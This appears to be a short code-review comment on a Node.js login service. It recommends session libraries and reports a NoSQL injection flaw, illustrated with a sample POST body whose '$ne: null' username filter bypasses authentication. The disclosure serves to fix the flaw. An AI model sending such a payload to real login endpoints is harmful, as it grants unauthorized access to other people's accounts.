check `express-session` and `connect-mongo` to reduce tones of boilerplate in this codebase.

---

NoSQL injection:

```
POST /auth/login
{
  "filter": {
    "username": { "$ne": null }
  },
  "password": "whatever"
}
```

---
